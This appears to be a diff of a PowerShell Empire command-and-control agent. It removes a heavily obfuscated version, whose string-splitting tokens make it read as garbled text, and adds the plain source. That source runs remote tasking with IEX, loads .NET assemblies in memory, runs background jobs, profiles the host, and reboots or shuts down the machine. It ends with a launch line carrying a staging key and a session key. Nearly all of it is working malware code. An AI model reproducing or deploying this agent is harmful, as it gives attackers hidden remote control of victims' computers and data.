-            (6hdage6hd+6hdnt 6hd+6hdse6hd+6hdt to 6hd+6hdn6hd+6hdeve6hd+6hdr die 6hd+6hdbased 6hd+6hdon checki6hd+6hdn L6hd+6hdi6hd+6hdmi6hd+6hdt6hd);
-        }
-        else
-        {
-            (6hdagent6hd+6hd 6hd+6hdLost6hd+6hdL6hd+6hdimit 6hd+6hds6hd+6hdet 6hd+6hdto6hd+6hd 6hd+ELN0dUscript:LostLimitELN);
-        }
-    }
-    function get-CjMlOSTlIMCjMIt {
-        (6hdag6hd+6hdent 6hd+6hdLos6hd+6hdtLim6hd+6hdit: 6hd+ELN0dUscript:LostLimitELN);
-    }
-    function SeCjMT-KIlLDCjMACjMTe {
-        param([string]0dU{DCjMAte})
-        0dU{sCjMcRipt:KilCjMLCjMdCjMATE} = 0dU{daCjMTe};
-        (6hdag6hd+6hdent 6hd+6hdk6hd+6hdilldat6hd+6hde6hd+6hd 6hd+6hdset6hd+6hd 6hd+6hdto6hd+6hd 6hd+ELN0dUscript:KillDateELN);
-    }
-    function GeT-CjMkILLdaCjMTE {
-        (6hdag6hd+6hdent 6hd+6hdkil6hd+6hdl6hd+6hddate: 6hd+ELN0dUscript:KillDateELN);
-    }
-    function SeTCjM-CjMwOrCjMkiNGhoUCjMRs {
-        param([string]0dU{HCjMOURS})
-        0dU{SCrICjMPT:CjMWoRKCjMiNGHCjMoURS} = 0dU{hCjMoUCjMRs};
-        ELNagent working hours set to 0dU(0dUscript:WorkingHours) ELN;
-    }
-    function geCjMT-woRkinGhCjMoCjMURS {
-        ELNagent working hours: 0dU(0dUscript:WorkingHours) ELN;
-    }
-    function GeCjMT-SYCjMSiCjMNFO {
-        0dU{SCjMTr} = ((6hd0sm6hd+6hdJ6hd).ELNRePLCjMACeELN(([ChAr]115+[ChAr]109+[ChAr]74),[string][ChAr]124));
-        0dU{sCjMTR} += 0dU{ScrICjMptCjM:CoCjMNCjMTrOLSCjMeCjMRVErs}[0dU{sCRipTCjM:SCjMeCjMRVerInCjMDeX}];
-        0dU{sCjMTr} += 6hdhmz6hd + [Environment]::ELNUCjMseRCjMdCjMoCjMMAiNNaMEELN+6hdhmz6hd+[Environment]::ELNusCjMeRNameELN+6hdhmz6hd+[Environment]::ELNMachINCjMECjMNameELN;
-        0dU{p} = (&(6hdGet-6hd+6hdWm6hd+6hdi6hd+6hdObject6hd) (6hdW6hd+6hdi6hd+6hdn36hd+6hd2_6hd+6hdNetw6hd+6hdorkAdapterC6hd+6hdon6hd+6hdfi6hd+6hdg6hd+6hduration6hd)hmz&(6hdWh6hd+6hdere6hd){0dU{_}.ELNIPCjMACjMDDressELN}hmz&(6hdS6hd+6hdelect6hd) -Expand (6hdIPA6hd+6hdddr6hd+6hdess6hd));
-        0dU{iCjMP} = @{0dU{TCjMRUe}=0dU{P}[0];0dU{fAlCjMse}=0dU{p}}[0dU{P}.ELNleCjMNGTHELN -lt 6];
-        0dU{SCjMTR}+=ELNhmz0dUipELN;
-        0dU{SCjMTR} += 6hdhmz6hd +(&(6hdG6hd+6hdet-Wm6hd+6hdiObject6hd) (6hdWi6hd+6hdn36hd+6hd2_Opera6hd+6hdtingSyst6hd+6hdem6hd)).ELNnACjMmEELN.(6hdspl6hd+6hdit6hd).Invoke(6hdhmz6hd)[0];
-        if(([Environment]::ELNUSeRCjMNACjMMeELN).(6hdT6hd+6hdoLower6hd).Invoke() -eq (6hdsy6hd+6hdst6hd+6hdem6hd)) {
-            0dU{sCjMTR} += ((6hd{0}T6hd+6hdrue6hd) -F  [chAR]124);
-        }
-        else{
-            0dU{SCjMTR} += 6hdhmz6hd+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::(6hdGetC6hd+6hdur6hd+6hdrent6hd).Invoke()).ELNICjMSCjMInRoleELN([Security.Principal.WindowsBuiltInRole] (6hdAdmini6hd+6hdst6hd+6hdr6hd+6hdator6hd));
-        }
-        0dU{N} = [System.Diagnostics.Process]::(6hdG6hd+6hde6hd+6hdtCurrentPro6hd+6hdcess6hd).Invoke();
-        0dU{SCjMTR} += 6hdhmz6hd+0dU{n}.ELNPrOCjMcESSCjMNAMEELN+6hdhmz6hd+0dU{N}.ELNiDELN;
-  ',';
-            0dU{lENgCjMTH} = 0dU{dECCjMoDCjMed}[4];
-            0dU{daCjMTa} = 0dU{DCjMeCODCjMED}[5];
-            if (0dU{dCjMEcoDeD}.ELNCoCjMUNtELN -eq 7) {0dU{ReCjMMACjMiNInG} = 0dU{dECjMcoDCjMed}[6]};
-            0dU{ReSUlCjMTCjMpaCjMckets} += 0dU(&(6hdP6hd+6hdro6hd+6hdcess-6hd+6hdTasking6hd) 0dU{TCjMyPE} 0dU{dCjMATa} 0dU{TACjMSCjMKID});
-            0dU{OFCjMFSEt} += 0dU(12 + 0dU{lEnGCjMTh});
-        }
-        (& 0dU{SeCjMNDmEsCjMsCjMAGE} -Packets 0dU{rCjMeCjMsCjMUltpAckECjMTS});
-    }
-    while (0dU{tCjMRUE}) {
-        if ( ((0dU{SCjMCCjMRiPT:killCjMDaTE}) -and ((&(6hdGet6hd+6hd-6hd+6hdDate6hd)) -gt 0dU{SCriCjMPTCjM:KCjMiLLCjMDATe})) -or ((!(0dU{scriPTCjM:LCjMOCjMStCjMLiMIT} -eq 0)) -and (0dU{sCjMcCjMRCjMIpt:miSCjMsEdCHEcKinS} -gt 0dU{scRCjMipCjMT:LCjMoStCjMLiCjMmIt})) ) {
-            0dU{PacKCjMets} = 0dU{nCjMULL};(& 0dU{GeTCjMTCjMASk});
-            ForEach(0dU{joCjMBnCjMAMe} in 0dU{SCjMCrIPCjMT:JoCjMBs}.ELNKeCjMYSELN) {
-                0dU{RESulCjMTs} = &(6hdS6hd+6hdtop-Ag6hd+6hdentJob6hd) -JobName 0dU{jCjMObnaCjMme} hmz &(6','+6hd.Ri6hd+6hdj6hd+6hdnd','6hdnd6hd+6hdom6hd)));
-        0dU{dCjMATA} = 0dU{eNCCjMOdICjMNG}.(6hdGetBy6hd+6hdt6hd+6hdes6hd).Invoke(0dU{scRIpT:CjMSeCjMssiONCjMid}) + @(0x01,0dU{meCjMTa},0x00,0x00) + [BitConverter]::(6hdGetBy6hd+6hdte6hd+6hds6hd).Invoke(0dU{ENCDATaCjMLCjMEn});
-        0dU{roUTiCjMNCjMGpCjMACKeTDaCjMTA} = &(6hdCo6hd+6hdnve6hd+6hdr6hd+6hdtTo-Rc6hd+6hd4By6hd+6hdteStream6hd) -In 0dU{DaCjMTA} -RCK 0dU(0dU{Iv}+0dU{SCjMKB});
-        if(0dU{eCjMNCjMcdATA}) {
-            (0dU{iv} + 0dU{ROuCjMTCjMInGPaCjMCkETDAtA} + 0dU{eNCjMcdCjMATA});
-        }
-        else {
-            (0dU{iCjMV} + 0dU{RoCjMUtInCjMgPaCkCjMECjMTDaTA});
- ','ELN)) {
-                                0dU{OCjMUT} hmz &(6hdA6hd','dM6hd+6hda6hd+6hdnagement.Autom6hd+6hdation.Po6hd+6hdwerShell6hd))::(6hdCre6hd+6hdate6hd).Invoke();
-        0dU{nCjMULl} = 0dU{pSCjMhoSt}.(6hdAddScr6hd+6hdipt6hd).Invoke(0dU{SCjMcCjMRiptStRICjMNG});
-        0dU{BCjMUFCjMFeR} = &(6hdN6hd+6hdew6hd+6hd-6hd+6hdObject6hd) (6hdS6hd+6hdy6hd+6hdstem.Manage6hd+6hdment6hd+6hd.6hd+6hdAu6hd+6hdtom6hd+6hdati6hd+6hdo6hd+6hdn.PSData6hd+6hdColl6hd+6hdectio6hd+6hdn[PSObje6hd+6hdct]6hd);
-        0dU{PSCjMOBjeCjMcTCOllECtiCjMoCjMNtYCjMpE} = [Type](6hdSystem.M6hd+6hdanagement.Aut6hd+6hdomati6hd+6hdon.6hd+6hdPSDataCo6hd+6hdl6hd+6hdlect6hd+6hdion[PSObject6hd+6hd]6hd);
-        0dU{bEGinCjMICjMNVOKE} = (0dU{pSCjMhOsT}.(6hdGetT6hd+6hdyp6hd+6hde6hd).Invoke().(6hdGet6hd+6hdM6hd+6hdethods6hd).Invoke() hmz &(6hd?6hd) { 0dU{_}.ELNNACjMMEELN -eq (6hdB6hd+6hde6hd+6hdginI6hd+6hdnvoke6hd) -and 0dU{_}.(6hdGet6hd+6hdPa6hd+6hdramete6hd+6hdrs6hd).Invoke().ELNCOCjMUNTELN -eq 2 }).ELNmakECjMGenERCjMiCmCjMETCjMhOdELN(@([PSObject], [PSObject]));
-        0dU{JCjMoB} = 0dU{bCjMEgCjMICjMNinVoke}.ELNiNCjMVCjMOKeELN(0dU{psHoCjMST}, @((0dU{BCjMUFFer} -as 0dU{PSobCjMjCjMECtCoCjMLLECjMCtionTCjMYPE}), (0dU{bCjMUfFer} -as 0dU{PCjMsObCjMjECTCjMCOCjMLLECjMCTCjMIoNType})));
-        0dU{sCCjMRICjMpt:Jobs}[0dU{rCjMACjMNDNaMe}] = @{(6hdA6hd+6hdlias6hd)=0dU{rACjMNDNACjMme}; (6hdAppD6hd+6hdoma6hd+6hdin6hd)=0dU{aCjMPPDOMCjMACjMin}; (6hdPSHos6hd+6hdt6hd)=0dU{pSHCjMost}; (6hdJo6hd+6hdb6hd)=0dU{jCjMob}; (6hdBuff6hd+6hder6hd)=0dU{BuCjMFFCjMer}};
-        0dU{rACjMNdNCjMAmE};
-    }
-    function GeCjMT-AgentjOBcOCjMMCjMPleteD {
-        param(0dU{JCjMobCjMName})
-        if(0dU{ScrCjMipT:CjMjOCjMBS}.(6hdCon6hd+6hdtai6hd+6hdns6hd+6hdKey6hd).Invoke(0dU{JObNCjMAMe})) {
-            0dU{SCriCjMPTCjM:JobS}[0dU{jCjMOBnAME}][(6hdJo6hd+6hdb6hd)].ELNIsCjMcOmpLCjMeTEDELN;
-        }
-    }
-    function receCjMivE-AgCjMEntCjMJOB {
-        param(0dU{JCjMobCjMNAME})
-        if(0dU{sCjMcriPt:JoCjMBS}.(6hdC6hd+6hdon6hd+6hdt6hd+6hdainsKey6hd).Invoke(0dU{JoBCjMNaCjMME})) {
-            0dU{scRCjMiCjMpT:JCjMobs}[0dU{joCjMBNamE}][(6hdB6hd+6hdu6hd+6hdffer6hd)].(6hdR6hd+6hdeadAl6hd+6hdl6hd).Invoke();
-        }
-    }
-    function StCjMOP-AgentCjMjoB {
-        param(0dU{JOCjMBnCjMAMe})
-        if(0dU{SCjMcRIPT:jOCjMBS}.(6hdCo6hd+6hdntainsK6hd+6hdey6hd).Invoke(0dU{jCjMobnAmE})) {
-            0dU{nUCjMLl} = 0dU{SCjMCCjMRIPT:JoBs}[0dU{jCjMObnCjMAme}][(6hdP6hd+6hdSHo6hd+6hdst6hd)].(6hdS6hd+6hdtop6hd).Invoke();
-            0dU{SCRIpCjMT:CjMjObS}[0dU{JoCjMBCjMNaME}][(6hdB6hd+6hduffe6hd+6hdr6hd)].(6hdRea6hd+6hddAll6hd).Invoke();
-            0dU{NuCjMll} = [AppDomain]::ELNunCjMLCjMOaDELN(0dU{ScRCjMIPT:CjMjCjMObS}[0dU{jOBNCjMACjMMe}][(6hdAp6hd+6hdpDo6hd+6hdmain6hd)]);
-            0dU{SCjMCCjMRIPT:CjMjObs}.(6hdRem6hd+6hdove6hd).Invoke(0dU{jObCjMNAme});
-        }
-    }
-    function UPDATECjM-CjMprOfiCjMLE {
-        param(0dU{pCjMRoCjMFIlE})
-        0dU{pCjMROFiCjMLCjMEpArTs} = 0dU{PCjMROfICjMLE}.(6hds6hd+6hdplit6hd).Invoke(6hdhmz6hd);
-        0dU{scCjMRIPTCjM:tASkuCjMRis} = 0dU{prOCjMFiCjMLeCjMPaRTS}[0].(6hdspl6hd+6hdit6hd).Invoke(6hd,6hd);
-        0dU{sCRiCjMpt:uSCjMERAGCjMeCjMNt} = 0dU{PROFCjMiLCjMePArCjMTS}[1];
-        0dU{ScRipT:CjMsCjMESsICjMonCjMID} = 0dU{SESSCjMioNCjMiD};
-        0dU{sCRIPCjMT:hECjMADERs} = @{};
-        if(0dU{proFCjMiCjMleCjMPARtS}[2]) {
-            0dU{PrOfICjMLePACjMRCjMTs}[2..0dU{PrCjMoCjMFilEpCjMArTs}.ELNlengCjMThELN] hmz &(6hdFor6hd+6hdEach-Obje6hd+6hdct6hd) {
-                0dU{PACjMRCjMTS} = 0dU{_}.(6hdS6hd+6hdplit6hd).Invoke(6hd:6hd);
-                0dU{scRIptCjM:HECjMAdECjMRs}.ELNACjMdDELN(0dU{pCjMARts}[0],0dU{PCjMArTS}[1]);
-            }
-        }
-        (6hdAge6hd+6hdnt 6hd+6hdupda6hd+6hdt6hd+6hded 6hd+6hdw6hd+6hdith 6hd+6hdprof6hd+6hdile 6hd+ELN0dUProfileELN);
-    }
-    function GETCjM-filepCjMART {
-        Param(
-          ','+6hddd6hd+6hd-Member6hd) (6hdNotepr6hd+6hdop6hd+6hde6hd+6hdrty6hd) (6hdInte6hd+6hdrface6hd) 0dU(0dU{ADAPCjMTECjMRs}[0dU{_}.ELNiNtCjMerFaCECjMInDexELN] -join ELN,ELN);
-                            }
-                            else {
-                                0dU{OCjMUt} hmz &(6hdAdd-6hd+6hdM6hd+6hde6hd+6hdmber6hd) (6hdN6hd+6hdot6hd+6hdeproperty6hd) (6hdInt6hd+6hde6hd+6hdrface6hd) (6hd16hd+6hd26hd+6hd7.0.0.16hd);
-                            }
-                            0dU{oCjMUT} hmz &(6hdA6hd+6hddd-M6hd+6hdember6hd) (6hdNo6hd+6hdtep6hd+6hdrop6hd+6hderty6hd) (6hdMetr6hd+6hdic6hd) 0dU{_}.ELNMCjMeTrICjMC1ELN;
-                            0dU{oCjMUT};
-                        } hmz &(6hdConv6hd+6hder6hd+6hdt6hd+6hdTo-Json6hd);
+                    $array = @();
+                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) };
+                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) };
+                    $directory = Get-Item -force -Path $path;
+                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress;
+                    if ($directory -eq $null)
+                    {
+                        $output = "User does not have access to directory " + $path;
                     }
-                    else { 0dU{OCjMUCjMTPuT} = &(6hdro6hd+6hdute6hd) 0dU{cmCjMDarCjMGS} };
                 }
-                ((6hd(w6hd+6hdh6hd+6hdoamiJIZ6hd+6hdge6hd+6hdt6hd+6hduid)6hd)  -RepLaCe6hdJIZ6hd,[chaR]124) { 0dU{oCjMUCjMTput} = [Security.Principal.WindowsIdentity]::(6hdG6hd+6hdet6hd+6hdC6hd+6hdurrent6hd).Invoke().ELNnCjMAmeELN };
-                (6hdhostna6hd+6hdm6hd+6hde6hd) {
-                    0dU{OCjMUTPut} = [System.Net.Dns]::(6hdGetHostBy6hd+6hdN6hd+6hda6hd+6hdm6hd+6hde6hd).Invoke((0dU{enCjMVCjM:coMPUtECjMRCjMNaME}));
+                Encode-Packet -data $output -type $type -ResultID $ResultID;
+            }
+            elseif($type -eq 44){
+                try{
+                    $parts = $data.split(",");
+                    $params = $parts[1..$parts.length];
+                    $bytes = [System.Convert]::FromBase64String($parts[0]);
+                    $ms = New-Object System.IO.MemoryStream;
+                    $output = New-Object System.IO.MemoryStream;
+                    $ms.Write($bytes, 0, $bytes.Length);
+                    $ms.Seek(0,0) | Out-Null;
+                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
+                    $buffer = [System.Byte[]]::CreateInstance([System.Byte],4096);
+                    $bytesRead = $sr.Read($buffer, 0, $buffer.length);
+                    while($bytesRead -ne 0){
+                        $output.Write($buffer,0,$bytesRead);
+                        $bytesRead = $sr.Read($buffer, 0, $buffer.length);
+                    }
+                    $assemBytes = $output.ToArray();
+                    $assem = [Reflection.Assembly]::load($assemBytes);
+                    $strmprop = $assem.GetType("Task").GetProperty("OutputStream");
+                    if(!$strmprop){
+                        $Results = $assem.GetType("Task").GetMethod("Execute").Invoke($null, $params);
+                    }
+                    else{
+                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
+                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
+                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream);
+                        $dict = @{"assembly" = $assem; "params" = $params; "pipe" = $pipeClientStream};
+                        $ps = [PowerShell]::Create();
+                        $task = $ps.AddScript('
+                        [CmdletBinding()]
+                        param(
+                            [System.Reflection.Assembly]
+                            $assembly,
+                            [String[]]
+                            $params,
+                            [IO.Pipes.AnonymousPipeClientStream]
+                            $Pipe
+                        )
+                        try {
+                            $streamProp = $assembly.GetType("Task").GetProperty("OutputStream");
+                            $streamProp.SetValue($null, $pipe, $null);
+                            $assembly.GetType("Task").GetMethod("Execute").Invoke($null,$params);
+                            }
+                        finally {
+                            $pipe.Dispose();
+                            }
+').AddParameters($dict).BeginInvoke();
+                        $pipeOutput = [Text.StringBuilder]::new();
+                        $buffer = [char[]]::new($pipeServerStream.InBufferSize);
+                        while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
+                            [void]$pipeOutput.Append($buffer, 0, $read);
+                        }
+                        $ps.EndInvoke($task);
+                        $Results = $pipeOutput.ToString();
+                    }
+                    Encode-Packet -data $results -type 40 -ResultID $ResultID;
                 }
-                ((6hd(6hd+6hdreboot{0}r6hd+6hdestart6hd+6hd)6hd) -f [cHAR]124) { &(6hdResta6hd+6hdrt-Com6hd+6hdpu6hd+6hdte6hd+6hdr6hd) -force };
-                (6hdshutd6hd+6hdo6hd+6hdwn6hd) { &(6hdStop-6hd+6hdCompu6hd+6hdter6hd) -force };
-                (6hddef6hd+6hda6hd+6hdult6hd) {
-                    if (0dU{cmdCjMACjMRGS}.ELNlENCjMgtHELN -eq 6hd6hd) { 0dU{OCjMUtCjMPut} = &(6hdIE6hd+6hdX6hd) 0dU{CCjMmD} hmz &(6hdOu6hd+6hdt6hd+6hd-Stri6hd+6hdng6hd) }
-                    else { 0dU{ouCjMTput} = &(6hdIE6hd+6hdX6hd) (ELN0dUcmd ELN+ELN0dUcmdargsELN) hmz &(6hdOu6hd+6hdt6hd+6hd-Stri6hd+6hdng6hd) };
+                catch {
+                    Encode-Packet -type 0 -data '[!] Error while executing assembly' -ResultID $ResultID;
                 }
             }
+            elseif($type -eq 50) {
+                $Downloads = $Script:Jobs.Keys -join "`n";
+                Encode-Packet -data ("Running Jobs:`n$Downloads") -type $type -ResultID $ResultID;
+            }
+            elseif($type -eq 51) {
+                $JobName = $data;
+                $JobResultID = $ResultIDs[$JobName];
+                try {
+                    $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+                    if($Results -and $($Results.trim() -ne '')) {
+                        Encode-Packet -type $type -data $($Results) -ResultID $JobResultID;
+                    }
+                    Encode-Packet -type 51 -data "Job $JobName killed." -ResultID $JobResultID;
+                }
+                catch {
+                    Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID;
+                }
+            }
+            elseif($type -eq 60) {
+                Encode-Packet -type 0 -data '[!] SOCKS server not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 61) {
+                Encode-Packet -type 0 -data '[!] SOCKS server data not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 100 -or $type -eq 118) {
+                $ResultData = IEX $data;
+                if($ResultData) {
+                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 101 -or $type -eq 119) {
+                $prefix = $data.Substring(0,15);
+                $extension = $data.Substring(15,5);
+                $data = $data.Substring(20);
+                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID;
+            }
+            elseif($type -eq 110 -or $type -eq 112) {
+                $jobID = Start-AgentJob $data;
+                $script:ResultIDs[$jobID]=$resultID;
+                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
+            }
+            elseif($type -eq 111 -or $type -eq 113) {
+                Encode-Packet -type 0 -data '[!] Dynamic code execution, no wait, save output not implemented' -ResultID $ResultID;
+            }
+            elseif($type -eq 120) {
+                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
+                Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID;
+            }
+            elseif($type -eq 121) {
+                $script = Decrypt-Bytes $script:ImportedScript;
+                if ($script) {
+                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data");
+                    $script:ResultIDs[$jobID]=$ResultID;
+                    Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 130) {
+                try {
+                    IEX $data
+                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID;
+                }
+                catch {
+                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID;
+                }
+            }
+            elseif($type -eq 131) {
+                $script:CurrentListenerName = $data;
+                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID;
+            }
+            else{
+                Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID;
+            }
         }
-        ELNCjMnELN+(0dU{ouTCjMPCjMUt});
+        catch [System.Exception] {
+            Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID;
+        }
     }
-    function stACjMRt-ACjMGEnTCjMjoB {
-        param(0dU{SCjMcriPtStrCjMING})
-        0dU{RCjMANCjMdnAME} = -join((6hdABC6hd+6hdD6hd+6hdEFGHKLMN6hd+6hdPR6hd+6hdS6hd+6hdTU6hd+6hdVWXYZ6hd+6hd16hd+6hd23456786hd+6hd96hd).(6hdToChar6hd+6hdArra6hd+6hdy6hd).Invoke()hmz&(6hdG6hd+6hde6hd+6hdt-Ran6hd+6hddom6hd) -Count 6);
-        0dU{ACjMpCjMpCjMdoMaiN} = [AppDomain]::(6hdCr6hd+6hdeateDom6hd+6hdain6hd).Invoke(0dU{RANCjMDnCjMAmE});
-        0dU{PsCjMhCjMoSt} = 0dU{aCjMPPdOMACjMiN}.ELNLOCjMAdELN([PSObject].ELNAsCjMSEmCjMBlyELN.ELNfCjMULlNaCjMmeELN).(6hdGe6hd+6hdtType6hd).Invoke((6hdSyste6hd+6hdm6hd+6hd.6hd+6h')).REplAcE('hmz','|').REplAcE(([cHar]48+[cHar]100+[cHar]85),[string][cHar]36).REplAcE(([cHar]69+[cHar]76+[cHar]78),[string][cHar]34).REplAcE('F07','\').REplAcE(([cHar]54+[cHar]104+[cHar]100),[string][cHar]39).REplAcE(([cHar]67+[cHar]106+[cHar]77),'`')|. ((geT-varIAbLE '*mDR*').nAMe[3,11,2]-JOiN'')
+    function Process-TaskingPackets {
+        param($Tasking)
+        $TaskingBytes = Decrypt-Bytes $Tasking;
+        if (-not $TaskingBytes) {
+            return;
+        }
+        $Decoded = Decode-Packet $TaskingBytes;
+        $Type = $Decoded[0];
+        $TotalPackets = $Decoded[1];
+        $PacketNum = $Decoded[2];
+        $TaskID = $Decoded[3];
+        $Length = $Decoded[4];
+        $Data = $Decoded[5];
+        $Remaining = $Decoded[6];
+        $ResultPackets = $(Process-Tasking $Type $Data $TaskID);
+        $Offset = 12 + $Length;
+        while($Remaining.Length -ne 0) {
+            $Decoded = Decode-Packet $TaskingBytes $Offset;
+            $Type = $Decoded[0];
+            $TotalPackets = $Decoded[1];
+            $PacketNum = $Decoded[2];
+            $TaskID = $Decoded[3];
+            $Length = $Decoded[4];
+            $Data = $Decoded[5];
+            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]};
+            $ResultPackets += $(Process-Tasking $Type $Data $TaskID);
+            $Offset += $(12 + $Length);
+        }
+        (& $SendMessage -Packets $ResultPackets);
+    }
+    while ($True) {
+        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
+            $Packets = $null;(& $GetTask);
+            ForEach($JobName in $Script:Jobs.Keys) {
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+                $JobResultID = $script:ResultIDs[$JobName];
+                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
+                $script:ResultIDs.Remove($JobName);
+            }
+            if ($Packets) {
+                (& $SendMessage -Packets $Packets);
+            }
+            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
+                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate";
+            }
+            else {
+                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached";
+            }
+            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg));
+            exit;
+        }
+        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {
+            $current = Get-Date;
+            $start = Get-Date ($script:WorkingHours.split("-")[0]);
+            $end = Get-Date ($script:WorkingHours.split("-")[1]);
+            if (($end-$start).hours -lt 0) {
+                $start = $start.AddDays(-1);
+            }
+            $startCheck = $current -ge $start;
+            $endCheck = $current -le $end;
+            if ((-not $startCheck) -or (-not $endCheck)) {
+                $sleepSeconds = ($start - $current).TotalSeconds;
+                if($sleepSeconds -lt 0) {
+                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds;
+                }
+                Start-Sleep -Seconds $sleepSeconds;
+            }
+        }
+        if ($script:AgentDelay -ne 0) {
+            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay);
+            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay);
+            if ($SleepMin -eq $SleepMax) {
+                $SleepTime = $SleepMin;
+            }
+            else{
+                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax;
+            }
+            Start-Sleep -Seconds $sleepTime;
+        }
+        $JobResults = $Null;
+        ForEach($JobName in $Script:Jobs.Keys) {
+            $JobResultID = $script:ResultIDs[$JobName];
+            if(Get-AgentJobCompleted -JobName $JobName) {
+                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String;
+            }
+            else {
+                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String;
+            }
+            if($Results) {
+                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID);
+            }
+        }
+        if ($JobResults) {
+            ((& $SendMessage -Packets $JobResults));
+        }
+        $TaskData = (& $GetTask);
+        if ($TaskData) {
+            $script:MissedCheckins = 0;
+            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
+                Decode-RoutingPacket -PacketData $TaskData;
+            }
+        }
+        [GC]::Collect();
+    }
+}
+
+Invoke-Empire -Servers @('') -StagingKey 'ddd55e431c266fe6cc8ee989a84dfe1c' -SessionKey 'mU4[?zb2!c%Cf~uyn3hM01TFX#DBsw9o' -SessionID 'Y7K1L1ZX' -WorkingHours '' -KillDate '';
